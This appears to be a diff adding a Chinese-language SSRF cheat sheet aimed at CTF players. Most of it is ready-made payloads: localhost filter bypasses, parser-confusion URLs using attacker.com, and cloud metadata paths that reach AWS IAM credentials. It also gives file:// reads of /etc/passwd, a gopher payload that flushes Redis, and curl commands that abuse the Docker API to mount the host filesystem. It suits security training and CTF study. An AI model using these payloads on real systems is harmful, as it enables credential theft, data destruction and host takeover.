@@ -1,0 +1,112 @@
+# SSRF IP 过滤绕过与协议利用
+
+## IP 过滤绕过大全
+
+当 `127.0.0.1` 和 `localhost` 被过滤时：
+
+```
+# 十进制
+http://2130706433/          (127.0.0.1 的十进制)
+http://0177.0.0.1/          (八进制)
+
+# 十六进制
+http://0x7f000001/
+http://0x7f.0x0.0x0.0x1/
+
+# IPv6
+http://[::1]/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+
+# 特殊域名
+http://spoofed.burpcollaborator.net/   (解析到 127.0.0.1)
+http://localtest.me/                    (解析到 127.0.0.1)
+http://127.0.0.1.nip.io/
+
+# URL 解析差异
+http://127.0.0.1@attacker.com/        (@ 前面是 userinfo)
+http://attacker.com#@127.0.0.1/
+http://127.0.0.1%00@attacker.com/
+
+# 重定向绕过（最可靠）
+http://your-server.com/redirect?url=http://127.0.0.1/
+```
+
+## 内部服务探测
+
+```
+# 常见内部端口
+http://127.0.0.1:80/     (Web)
+http://127.0.0.1:8080/   (Tomcat/代理)
+http://127.0.0.1:8000/   (Django/开发服务器)
+http://127.0.0.1:3000/   (Node.js/Grafana)
+http://127.0.0.1:5000/   (Flask)
+http://127.0.0.1:6379/   (Redis - 可以 RCE!)
+http://127.0.0.1:9200/   (Elasticsearch)
+http://127.0.0.1:27017/  (MongoDB)
+http://127.0.0.1:11211/  (Memcached)
+```
+
+## 云元数据（高价值！）
+
+```
+# AWS
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# GCP
+http://metadata.google.internal/computeMetadata/v1/
+(需要 Header: Metadata-Flavor: Google)
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+(需要 Header: Metadata: true)
+```
+
+## 协议利用
+
+```
+# 文件读取
+url=file:///etc/passwd
+url=file:///flag.txt
+url=file:///app/app.py
+
+# Gopher（可以攻击 Redis/MySQL/SMTP）
+url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...
+
+# Dict（探测内部服务）
+url=dict://127.0.0.1:6379/info
+```
+
+**陷阱**：
+- `file://` 可能被禁但 `FILE://` 或 `File://` 可能放行
+- gopher 协议在 PHP curl 中默认可用，在 Python requests 中不可用
+- 有些 SSRF 只支持 HTTP/HTTPS，不支持 file/gopher
+
+## CTF 高级 SSRF 技巧
+
+### SSRF → Docker API RCE 链
+SSRF 探测到 `localhost:2375` (Docker API) 时，可读取容器文件并 RCE：
+```bash
+# 读取容器文件
+curl "http://target/ssrf?url=http://localhost:2375/containers/<id>/archive?path=/flag"
+# 创建恶意容器 + 执行命令
+curl -X POST "http://target/ssrf?url=http://localhost:2375/containers/create" \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"alpine","Cmd":["cat","/flag"],"HostConfig":{"Binds":["/:/host"]}}'
+```
+
+### URL 解析差异绕过白名单
+PHP `parse_url()` 和 curl 对多 `@` URL 的解析不同：
+```
+http://what:ever@127.0.0.1:80@allowed.host/path
+├─ parse_url() → host = allowed.host  (通过白名单)
+└─ curl        → 连接到 127.0.0.1:80  (实际 SSRF)
+```
+
+### Rogue MySQL Server 文件读取
+当 SSRF 可控 MySQL 连接地址时，搭建恶意 MySQL 服务器，利用 `LOAD DATA LOCAL INFILE` 读取客户端文件：
+```python
+# 恶意 MySQL 服务器回复 LOAD DATA LOCAL INFILE 请求
+# 客户端 MySQL 库自动发送指定文件内容
+# 工具: https://github.com/rmb122/rogue_mysql_server
+```
